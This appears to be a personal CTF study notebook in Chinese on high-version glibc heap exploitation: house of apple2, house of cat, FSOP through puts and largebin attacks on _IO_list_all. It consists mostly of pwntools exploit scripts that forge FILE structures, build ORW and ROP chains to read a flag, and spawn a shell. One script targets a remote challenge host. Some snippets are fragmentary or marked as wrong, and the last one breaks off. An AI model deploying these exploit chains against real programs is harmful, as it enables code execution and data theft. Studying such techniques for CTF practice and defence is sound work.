<font style="color:#2F8EF4;">附件：C:\Users\liuws\Desktop\pwn\堆\house   of   学习\高版本libc调试</font>

```python
add(0,0x450)
add(1,0x418)
add(2,0x440)
add(3,0x440)

dele(0)          #1

show(0)

p.recvuntil("\n")
libc_=u64(p.recvuntil("\x7f").ljust(8,b'\x00'))
log.success("libc_ -->"+hex(libc_))
libc_base= libc_ -0x21ace0
log.success("libc_base -->"+hex(libc_base))


add(4,0x500)
dele(2)          #2
edit(0,b'a'*0x10)
show(0)

p.recvuntil(b"a"*0x10)

heap_ = u64(p.recvuntil("\x55\x55\x55\x55")[-6:].ljust(8,b'\x00'))
log.success("heap_ -->"+hex(heap_))
heap_base = heap_ - 0x290
log.success("heap_base -->"+hex(heap_base))
listall = libc_base + libc.sym['_IO_list_all']
log.success(" listall --> "+hex(listall))

#largebin
payload =  p64(libc_)*2  + p64(0) + p64(listall - 0x20 )
edit(0,payload)
add(5,0x500)


file_addr = heap_base + 0xb10
IO_wide_data_addr = (file_addr + 0xd8 + 8) -0xe0   #指向初始地址
wide_vtable_addr = (file_addr + 0xd8 +8+ 8) -0x68 #指向system

fake_io = b""        #伪造_IO_list_all
fake_io += p64(0)#：IO read end
fake_io += p64(0)#·I0 read base
fake_io += p64(0)#·IO write base
fake_io += p64(1)#：IO write ptr
fake_io += p64(0)#IO write end
fake_io += p64(0)#：IO buf base;
fake_io += p64(0)#：IO buf end-should-usually be ( IO buf base-41)
fake_io += p64(0) #-from:IO save base·to
fake_io += p64(0)*3# markers
fake_io += p64(0)# the FILE- chain ptr
fake_io += p32(2)#：fileno-for-stderr-is-2
fake_io += p32(0)#：flags2, usually·0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #_Old offset, -1
fake_io += p16(0)#cur column
fake_io += b"\x00"#t： vtable offset
fake_io += b"\n"#e: shortbuf[1]
fake_io += p32(0)#· padding
fake_io += p64(libc_base+libc.sym['_IO_2_1_stdout_'] + 0x12e0)#：0 stdfile 1 lock/40xa0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #·_offset, -1
fake_io += p64(0)#codecvt, usually0
fake_io += p64(IO_wide_data_addr)#IO wide data *(fp + Oxa0)= A (也是在_IO_list_all堆地址）
fake_io += p64(0) *3# 8.fron freeres list to. _pads
fake_io += p32(0xFFFFFFFF) #：mode, usually -1
fake_io += b"\x00"*19 #：_unused2
fake_io = fake_io.ljust(0xD8 - 0x10,b'\x00')#·adiust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])#·fake vtable 设置跳表  条件2
fake_io += p64(wide_vtable_addr)    #
fake_io += p64(libc_base + libc.sym['system'])

edit(2, fake_io)
edit(1, p64(0)*0x82 +b' sh; ')
```

```plain
wfile = 0x7ffff7e02228#libc_base + libc.sym['_IO_wfile_jumps']
system =0x7ffff7c58740# libc_base+libc.sym['system']
swapcontext = 0x7ffff7c53e00+157#libc_base+0x5814d#swapcontext+157
magic_gadget = 0x7ffff7d6a050+29#+ libc.sym['svcudp_reply'] + 0x1d

log.success("magic_gadget -->"+hex(magic_gadget))
syscall = 0x00000000000288b5+libc_base
pop_rax = libc_base + next(libc.search(asm('pop rax;ret;')))
mprotect = libc_base+libc.sym['mprotect']
orw_addr=heap_base+0x1830
flag_addr = heap_base+0xf60      #0x55555555b000
sh_addr = heap_base+0xad0

fake_heap = heap_base + 0xb10
svcudp_reply= 0x7ffff7d6a050+29
heap1 = 0x55555555b290
heap = heap_base + 0xb10+0x200

fake_file = b''
fake_file = p64(0)+p64(1)
fake_file=  fake_file.ljust(0x28,b'\x00')+p64(fake_heap)
fake_file = fake_file.ljust(0x68,b'\x00')+p64(heap)       #lock处尽量写在bss段，因为在调用的时候会破坏read_
fake_file = fake_file.ljust(0x80,b'\x00')+p64(fake_heap)         #rax1  
fake_file = fake_file.ljust(0xb8,b'\x00')+p64(wfile)
payload = p64(0)*2+fake_file+p64(fake_heap+0xe8-0x68)+p64(system)



edit(2, payload)

edit(1, p64(0)*0x82 +b' sh; ')
```



<font style="color:#DF2A3F;">house  of  apple2  能用来写orw</font>

```python
file_addr=heap_base+0x700
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
_IO_stdfile_2_lock=libc_base+0x21ca60
og=libc_base+ogs[0]
system=libc_base+libc.sym['system']
leave_ret=libc_base+0x4da83
magic=libc_base+0x16a050+26
rdi=libc_base+0x000000000002a3e5
rsi=libc_base+0x000000000002be51
rdx_rbx=libc_base+0x00000000000904a9
openn=libc_base+libc.sym['open']
readd=libc_base+libc.sym['read']
writee=libc_base+libc.sym['write']
orw_addr=heap_base+0xb70
orw=b'./flag\x00\x00'
orw+=p64(rdx_rbx)+p64(0)+p64(orw_addr+0x100)+p64(rdi)+p64(orw_addr)+p64(rsi)+p64(0)+p64(openn)
orw+=p64(rdi)+p64(3)+p64(rsi)+p64(orw_addr+0x200)+p64(rdx_rbx)+p64(0x30)*2+p64(readd)
orw+=p64(rdi)+p64(1)+p64(rsi)+p64(orw_addr+0x200)+p64(rdx_rbx)+p64(0x30)*2+p64(writee)
orw=orw.ljust(0x128,b'\x00')+p64(leave_ret)
edit(4,0x300,orw)
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(orw_addr)  # _IO_save_base                              #在p64(rdx_rbx)所在地址-8的地方
fake_io += p64(0)*3  # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(magic)        ##svcudp_reply+26处的gadget
edit(2,0x100,fake_io)


第二种写法     C:\Users\liuws\Desktop\pwn\轩辕杯\附件

from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *
 
def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------
context(os='linux', arch='amd64', log_level='debug')
#p = process('./pwn')
p=remote("27.25.151.26",21511)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
def add(idx, size):
	sla(b'Your choice >> ', b'1')
	sla(b'Index:\n', str(idx))
	sla(b'Size:\n', str(size))
def delete(idx):
	sla(b'Your choice >> ', b'2')
	sla(b'Index:\n', str(idx))
def show(idx):
	sla(b'Your choice >> ', b'4')
	sla(b'Index:\n', str(idx))
def edit(idx, data):
	sla(b'Your choice >> ', b'3')
	sla(b'Index:\n', str(idx))
	sla(b'Size:\n', str(len(data)))
	sleep(0.5)
	s(data)
def love(idx):
	sla(b'Your choice >> ', b'20006176')
	sla(b'Index:\n', str(idx))
 
 
add(0,0x490)
add(1,0x4a0)
delete(0)
 
#
 
add(2,0x4a0)
add(3,0x4a0)
love(2)
show(2)
libc_base=uu64()-0x21ace0
print(hex(libc_base))
 
IO_list_all=libc_base+libc.sym["_IO_list_all"]
 
setcontext=libc_base+libc.sym['setcontext']+61
rdi = libc_base+libc.search(asm("pop rdi\nret")).__next__()
rsi = libc_base+libc.search(asm("pop rsi\nret")).__next__()
rdx = libc_base+libc.search(asm("pop rdx\nret")).__next__()
rdx_r12= libc_base+libc.search(asm("pop rdx\npop r12\nret")).__next__()
rax = libc_base+libc.search(asm("pop rax\nret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscall\nret")).__next__()
open_=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
mprotect=libc_base + libc.sym['mprotect']
add(4,0x4b0)
show(2)
heap_addr=uu64()
print(hex(heap_addr))
add(0,0x490)
_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
 
chunk3=heap_addr # 伪造的fake_IO结构体的地址
orw  = p64(rdi) + p64(chunk3+0xe0+0xa0+0x10)  
orw += p64(rsi) + p64(0)
orw += p64(open_)
 
orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap_addr+0x200)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(read)
 
orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap_addr+0x200)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(write)
 
 
fake_ret=heap_addr+0xe0+0xe0+0x18
 
IO_FILE1 = p64(0)*3+p64(1)+b'\x00'*0x38+p64(0)                         #_chain
IO_FILE1+= p32(0)+b'\x08'                                              #_flags2
IO_FILE1 = IO_FILE1.ljust(0x80,b'\x00')+p64(chunk3)                    #lock
IO_FILE1 = IO_FILE1.ljust(0x90,b'\x00')+p64(chunk3+0xe0)               #_wide_data  ***  rdx
IO_FILE1 = IO_FILE1.ljust(0xb0,b'\x00')
IO_FILE1 = IO_FILE1.ljust(0xc8,b'\x00')+p64(_IO_wfile_jumps)           #vtable
 
IO_FILE1+= b'\x00'.ljust(0xa0,b'\x00')+p64(fake_ret)+p64(rdi+1)
IO_FILE1+= b'/flag\x00\x00\x00'.ljust(0x30,b'\x00')+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext)
IO_FILE1+= p64(rdi+1)+orw
edit(0,IO_FILE1)
 
delete(0)
edit(2,p64(0)+p64(ret)+p64(0)+p64(IO_list_all-0x20))
add(5,0x4c0)
#gdb.attach(p)
sla(b'Your choice >> ', b'5')
pr()
pr()
```

[https://xz.aliyun.com/news/12538](https://xz.aliyun.com/news/12538)

[https://xz.aliyun.com/news/16212](https://xz.aliyun.com/news/16212)



<font style="color:#2F8EF4;">将wide_vtable_add - 0x68 指向 ROP链子</font>

<font style="color:#2F8EF4;"></font>

#### <font style="color:#2F8EF4;">ORW  之  svcudp_reply</font>
C:\Users\liuws\Desktop\pwn\轩辕杯\附件   为例第一种写法

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1757575392188-8d648831-c343-430b-b3fd-fa6a65bc1d8b.png" width="1789.3333333333333" alt="" title="" crop="0,0,1,1" id="u0b934239" class="ne-image">

```python
file_addr=heap_base+0x700
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
_IO_stdfile_2_lock=libc_base+0x21ca60
og=libc_base+ogs[0]
system=libc_base+libc.sym['system']
leave_ret=libc_base+0x4da83
magic=libc_base+0x16a050+26
rdi=libc_base+0x000000000002a3e5
rsi=libc_base+0x000000000002be51
rdx_rbx=libc_base+0x00000000000904a9
openn=libc_base+libc.sym['open']
readd=libc_base+libc.sym['read']
writee=libc_base+libc.sym['write']
orw_addr=heap_base+0xb70
orw=b'./flag\x00\x00'
orw+=p64(rdx_rbx)+p64(0)+p64(orw_addr+0x100)+p64(rdi)+p64(orw_addr)+p64(rsi)+p64(0)+p64(openn)
orw+=p64(rdi)+p64(3)+p64(rsi)+p64(orw_addr+0x200)+p64(rdx_rbx)+p64(0x30)*2+p64(readd)
orw+=p64(rdi)+p64(1)+p64(rsi)+p64(orw_addr+0x200)+p64(rdx_rbx)+p64(0x30)*2+p64(writee)
orw=orw.ljust(0x128,b'\x00')+p64(leave_ret)
edit(4,0x300,orw)
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(orw_addr)  # _IO_save_base                              #在p64(rdx_rbx)所在地址-8的地方
fake_io += p64(0)*3  # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(magic)        ##svcudp_reply+26处的gadget
edit(2,0x100,fake_io)
```

##### orw出现的错误
###### <font style="color:#2F8EF4;">一  伪造_IO_save_base时出现错误</font>
_IO_save_base应该为orw中第一个pop所在的地址减8出

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1757575756821-81fd9bb9-e306-4edb-914a-15492b4825cc.png" width="856.6666666666666" alt="" title="" crop="0,0,1,1" id="ud915f5d6" class="ne-image">

<font style="color:#2F8EF4;">rbp  变成  rdi+0x48所在存放的地址即_IO_save_base  因为要进行一次栈迁移，所有需要在~~~~</font>

###### <font style="color:#2F8EF4;">二   leave_ret所在的位置放错</font>
<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1757576366199-40c847e6-4dd3-4ffb-bc07-ddbbda4885d2.png" width="522" alt="" title="" crop="0,0,1,1" id="uaa34ddee" class="ne-image">

ni之后

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1757576314525-0be236b2-0bb1-4b71-9206-e000fd862d05.png" width="424.6666666666667" alt="" title="" crop="0,0,1,1" id="uf4ab9a30" class="ne-image">

发生了变化，在rbp+0x10的地址内容发生了变化，从而导致不能正常进行leave_ret

### <font style="color:#2F8EF4;">orw  之  setcontext</font>
<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1758164615786-691cebfb-f680-4e81-82cf-37d3e8f7abe1.png" width="757" alt="" title="" crop="0,0,1,1" id="u8b5aba30" class="ne-image">

```plain
file_addr = heap_base + 0xb10
heap2 = 0x5555555596f0 + 0x10     # 构造orw的地方也是puts触发io调用system处
wide_vtable_addr = (file_addr + 0xd8 +8+ 8) -0x68 #指向system

fake_io = b""        #伪造_IO_list_all
fake_io += p64(libc_)#：IO read end
fake_io += p64(libc_)#·I0 read base
fake_io += p64(0)#·IO write base
fake_io += p64(1)#：IO write ptr
fake_io += p64(0)#IO write end
fake_io += p64(0)#：IO buf base;
fake_io += p64(0)#：IO buf end-should-usually be ( IO buf base-41)
fake_io += p64(0) #-from:IO save base·to
fake_io += p64(0)*3# markers
fake_io += p64(0)# the FILE- chain ptr
fake_io += p32(2)#：fileno-for-stderr-is-2
fake_io += p32(0)#：flags2, usually·0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #_Old offset, -1
fake_io += p16(0)#cur column
fake_io += b"\x00"#t： vtable offset
fake_io += b"\n"#e: shortbuf[1]
fake_io += p32(0)#· padding
fake_io += p64(libc_base+libc.sym['_IO_2_1_stdout_'] + 0x12e0)#：0 stdfile 1 lock/40xa0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #·_offset, -1
fake_io += p64(0)#codecvt, usually0
fake_io += p64(heap2)           ##rdx
fake_io += p64(0) *3# 8.fron freeres list to. _pads
fake_io += p32(0xFFFFFFFF) #：mode, usually -1
fake_io += b"\x00"*19 #：_unused2
fake_io = fake_io.ljust(0xD8 - 0x10,b'\x00')#·adiust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])#·fake vtable 设置跳表  条件2
fake_io += p64(wide_vtable_addr)    #
fake_io += p64(libc_base + libc.sym['system'])
system = libc_base + libc.sym['system']
edit(2, fake_io)

setcontext=libc_base+libc.sym['setcontext']+61
rdi = libc_base+libc.search(asm("pop rdi\nret")).__next__()
rsi = libc_base+libc.search(asm("pop rsi\nret")).__next__()
rdx = libc_base+libc.search(asm("pop rdx\nret")).__next__()
rdx_r12= libc_base+libc.search(asm("pop rdx\npop r12\nret")).__next__()
rax = libc_base+libc.search(asm("pop rax\nret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscall\nret")).__next__()
open_=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
mprotect=libc_base + libc.sym['mprotect']

orw = p64(setcontext)
orw += p64(rdx_r12)+p64(0)*2
orw  += p64(rdi) + p64(heap2)  
orw += p64(rsi) + p64(0)
orw += p64(open_)
 
orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap2+0x200)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(read)
 
orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap2+0x200)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(write)



orw = orw.ljust(0x65,b'\x00')

bz = b'/flag\x00\x00\x00'
bz = bz.ljust(0x68,b'\x00')+p64(0x555555559700) #flag地址    rdi
bz += p64(0)
bz = bz.ljust(0x78,b'\x00')
bz = bz.ljust(0xa0,b'\x00')+p64(0x555555559830) #gadget地址   rcx
bz += p64(open_)      
bz = bz.ljust(0xe0,b'\x00') 

edit(1, bz+p64(0x5555555597e0+8-0x68)'''调用setcontext'''+orw +b' sh; ')

```

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1758164525322-d6b3679c-c113-4f21-9328-502059510892.png" width="1281" alt="" title="" crop="0,0,1,1" id="u9f46a822" class="ne-image">

将 open 放在 rcx 处 然后 push 在返回的时候就会跳到  open  然后控制  rsp 指向  gadget



### <font style="color:#000000;">利用puts函数触发io流</font>
#### puts函数原本调用链
1. _IO_file_xsputn --> _IO_file_overflow  --> _IO_do_write  --> _IO_file_write  --> write
2. __overflow  --> _IO_do_write   ~~~~
3. 当stdout在bss段上时，是不能直接伪造_IO_2_1_stdout_

<font style="color:#DF2A3F;">注：暂时看到的是需要将_IO_2_1_stdout_所在的地址当作堆块申请出来，然后进行改动</font>

#### <font style="color:#000000;">触发条件</font>
+ **<font style="color:rgb(86, 20, 0);">flags = 0x00008000</font>**
+ **<font style="color:rgb(86, 20, 0);">_IO_backup_base > _IO_save_base (1>0)</font>**
+ **<font style="color:rgb(86, 20, 0);">无需设置 _lock字段为可写地址</font>**
+ **<font style="color:rgb(86, 20, 0);">mode = 0</font>**

#### stdout在bss段上时
##### 直接将_IO_2_1_stdout_申请出来
```plain
fake_io_addr  = _IO_2_1_stdout_ # 伪造的fake_IO结构体的地址
fake_IO_FILE  = b''
fake_IO_FILE += p32(0x01018001)+b";sh\x00"
fake_IO_FILE  = fake_IO_FILE.ljust(0x50,b'\x00')
fake_IO_FILE += p64(1) #_IO_backup_base=rdx 
fake_IO_FILE += p64(system) #_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE  = fake_IO_FILE.ljust(0xa0,b'\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1  [rax+0xe0]
fake_IO_FILE  = fake_IO_FILE.ljust(0xc0,b'\x00')
fake_IO_FILE += p64(0) #mode=0
fake_IO_FILE  = fake_IO_FILE.ljust(0xd8,b'\x00')
fake_IO_FILE += p64(libc_base+libc.sym['_IO_wfile_jumps']+0x10) # vtable=IO_wfile_jumps+0x10 FSOP改为IO_wfiel_jumps+0x30
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40) # #rax2 -> to make [rax+0x18] = call addr
```

##### ~~利用largebin将stdout改成堆地址（以下伪造io只适用于2.23 因为存在~~`~~_IO_vtable_check~~`）    <font style="color:#DF2A3F;">错啦</font>
```plain
fake_io = b""       
fake_io += p64(main_arena+96)#：IO read end
fake_io += p64(main_arena+96)#·I0 read base   确保在下次申请堆块的时候不报错
fake_io += p64(0)#·IO write base
fake_io += p64(0)#：IO write ptr
fake_io += p64(0)#IO write end
fake_io += p64(0)#：IO buf base;
fake_io += p64(0)#：IO buf end-should-usually be ( IO buf base-41)
fake_io += p64(0) #-from:IO save base·to
fake_io += p64(1) #_IO_backup_base
fake_io += p64(0)*2# markers
fake_io += p64(0)# the FILE- chain ptr
fake_io += p32(2)#：fileno-for-stderr-is-2
fake_io += p32(0)#：flags2, usually·0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #_Old offset, -1
fake_io += p16(0)#cur column
fake_io += b"\x00"#t： vtable offset
fake_io += b"\n"#e: shortbuf[1]
fake_io += p32(0)#· padding
fake_io += p64(libc_base+libc.sym['_IO_2_1_stdout_'] + 0x12e0)#：0 stdfile 1 lock/40xa0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #·_offset, -1
fake_io += p64(0)#codecvt, usually0
fake_io += p64(IO_wide_data_addr)       #IO wide data *(fp + Oxa0)= A (也是在_IO_list_all堆地址）
fake_io += p64(0) *3# 8.fron freeres list to. _pads
fake_io += p32(0) #：mode, usually 0
fake_io += b"\x00"*19 #：_unused2
fake_io = fake_io.ljust(0xD8 - 0x10,b'\x00')#·adiust to vtable
fake_io += p64(0x555555559bb8)#fake vtable 设置跳表  条件2   system - 0x38
```

注：可以将调表改成_IO_str_jump里面的，<font style="color:#DF2A3F;">_IO_wfile_jumps（不可以） </font>利用宽字符，但是在程序进入 puts函数之后 mode  会变成  -1  这也就意味着部分利用puts刷新io的程序是不行的  同时在进行_overflow的时候会卡住

 利用apple2 时 ，会出现的情况 ， IO_write_ptr  <  IO_write_base的情况，且不可进行堆风水来调控，

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1748003895420-34070657-a4c1-444b-b164-bfc86e5bc1a3.png" width="359" alt="" title="" crop="0,0,1,1" id="ud2247e68" class="ne-image">

所以利用该方式，需要满足两个条件，IO write ptr  <  IO write base  且  mode = -1  2.23版本可以直接改跳表可以完美避开一些检查



_IO_wfile_xsputn-->_IO_wdefault_xsputn-->_IO_wdoallocbuf-->system

```plain
p.recvuntil("\n")
libc_=u64(p.recvuntil("\x7f").ljust(8,b'\x00'))    #  main_arena+96
log.success("libc_ -->"+hex(libc_))
libc_base= libc_ -0x21ace0
log.success("libc_base -->"+hex(libc_base))

heap_ = u64(p.recvuntil("\x55\x55\x55\x55")[-6:].ljust(8,b'\x00'))
log.success("heap_ -->"+hex(heap_))
heap_base = heap_ - 0x290
log.success("heap_base -->"+hex(heap_base))
listall = libc_base + libc.sym['_IO_list_all']
log.success(" listall --> "+hex(listall))
stdout = 0x555555558020

fd = 0x7ffff7e1b0e0    #main_arena+1120

file_addr = heap_base + 0xb10
IO_wide_data_addr = 0x555555559700   #其他堆地址
wide_vtable_addr = (file_addr + 0xd8 +8+ 8) -0x68 #指向system

fake_io = b""        #伪造_IO_list_all
fake_io += p64(libc_)#：IO read end
fake_io += p64(libc_)#·I0 read base
fake_io += p64(0)#·IO write base
fake_io += p64(1)#：IO write ptr
fake_io += p64(0)#IO write end
fake_io += p64(0)#：IO buf base;
fake_io += p64(0)#：IO buf end-should-usually be ( IO buf base-41)
fake_io += p64(0) #-from:IO save base·to
fake_io += p64(0)*3# markers
fake_io += p64(0)# the FILE- chain ptr
fake_io += p32(2)#：fileno-for-stderr-is-2
fake_io += p32(0)#：flags2, usually·0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #_Old offset, -1
fake_io += p16(0)#cur column
fake_io += b"\x00"#t： vtable offset
fake_io += b"\n"#e: shortbuf[1]
fake_io += p32(0)#· padding
fake_io += p64(libc_base+libc.sym['_IO_2_1_stdout_'] + 0x12e0)#：0 stdfile 1 lock/40xa0
fake_io += p64(0XFFFFFFFFFFFFFFFF) #·_offset, -1
fake_io += p64(0)#codecvt, usually0
fake_io += p64(IO_wide_data_addr)#IO wide data *(fp + Oxa0)= A (也是在_IO_list_all堆地址）
fake_io += p64(0) *3# 8.fron freeres list to. _pads
fake_io += p32(0xFFFFFFFF) #：mode, usually -1
fake_io += b"\x00"*19 #：_unused2
fake_io = fake_io.ljust(0xD8 - 0x10,b'\x00')#·adiust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])#·fake vtable 设置跳表  条件2
fake_io += p64(wide_vtable_addr)    #
fake_io += p64(libc_base + libc.sym['system'])
system = libc_base + libc.sym['system']
edit(2, fake_io)
edit(1, p64(0)*0x1c+p64(0x5555555597e0+8-0x68)+p64(system)*0x65 +b' sh; ')
#largebin
payload =  p64(fd)*2  + p64(0) + p64(stdout - 0x20 )
edit(0,payload)
bug()
add(5,0x500)

p.send(b'5')

```

#### stdout 不在bss段上
直接进行largrebin劫持即可





### house of cat（_malloc_assert触发io流）
<font style="color:#2F8EF4;">【强网杯2022&pwn&house_of_cat】</font>[https://www.bilibili.com/video/BV1XV4y1j7kf?vd_source=366ddcfb960bc44528433ecade6fa3f6](https://www.bilibili.com/video/BV1XV4y1j7kf?vd_source=366ddcfb960bc44528433ecade6fa3f6)



#### 前置知识
1. <font style="color:#2F8EF4;">house  of  kiwi/emma</font>
2. <font style="color:#2F8EF4;">修改  stderr/</font><font style="color:rgb(0, 0, 0);">_IO_list_all</font><font style="color:#2F8EF4;">  </font>
3. <font style="color:#2F8EF4;">触发条件：FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），第三种情况在高版本中已经删除;__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</font>
4. <font style="color:#2F8EF4;">调用链:</font>

**<font style="color:rgb(35, 38, 59);">__malloc_assert-> __fxprintf->__vfxprintf->locked_vfxprintf->__vfprintf_internal->_IO_wfile_seekoff->_IO_switch_to_wget_mode->setcontext->orw</font>**

#### <font style="color:#000000;">脚本</font>
[https://xz.aliyun.com/news/15379](https://xz.aliyun.com/news/15379)

[https://bbs.kanxue.com/thread-273895.htm](https://bbs.kanxue.com/thread-273895.htm)

[https://www.cnblogs.com/CH13hh/p/18415836](https://www.cnblogs.com/CH13hh/p/18415836)

```python
fake_io_addr = heap_base + 0xb00

fake_IO_FILE  =p64(0)*6
fake_IO_FILE +=p64(1)+p64(0)  #这里为了绕过检查
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx 这里是rdx
fake_IO_FILE +=p64(setcontext+0x3d)#_IO_save_end=call addr   这里是rax + 0x18的位置
fake_IO_FILE  =fake_IO_FILE.ljust(0x58,b'\x00')
fake_IO_FILE +=p64(0)  # _chain
fake_IO_FILE  =fake_IO_FILE.ljust(0x78,b'\x00')
fake_IO_FILE += p64(heap_base+0x200)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90,b'\x00')
fake_IO_FILE +=p64(heap_base+0xb30) #rax1  0x90位置为第一次的rax （rax+0xa0）
fake_IO_FILE = fake_IO_FILE.ljust(0xB0,b'\x00')
fake_IO_FILE += p64(0)
fake_IO_FILE = fake_IO_FILE.ljust(0xC8,b'\x00')
fake_IO_FILE += p64(libc_base+0x2160c0+0x10)  # vtable=_IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) *6
fake_IO_FILE += p64(fake_io_addr + 0x40) #rax2+0xe0
fake_IO_FILE += p64(0) * 7 + p64(fake_io_addr + 0x160) + p64(pop_rdi+1) #rdx + 0xa0 , 0xa8
fake_IO_FILE += orw
```

```python
flag_addr = heap_base + 0xb00 + 0x230
orw = flat(pop_rdi ,0 , close)
orw += flat(pop_rdi,flag_addr,pop_rsi,0,pop_rax,2,syscall)
orw += flat(pop_rdi,0,pop_rsi,heap_base + 0x500,pop_rdx_r12,0x30,0,read)
orw += flat(pop_rdi,1,pop_rsi,heap_base + 0x500,pop_rdx_r12,0x30,0,write)
orw += b'flag\x00\x00\x00\x00' + p64(0xdeadbeef)
```

[https://xz.aliyun.com/news/15379](https://xz.aliyun.com/news/15379)（house  of  cat  在2.35 以及 2.39下的运用)

#### 劫持stderr
```plain
add(0,0x420,'aaa')
add(1,0x430,'bbb')
add(2,0x418,'ccc')
delete(0)
add(3,0x440,'ddd')
show(0)
ru('Context:\n')
libcbase=u64(p.recv(6).ljust(8,'\x00'))-0x21a0d0
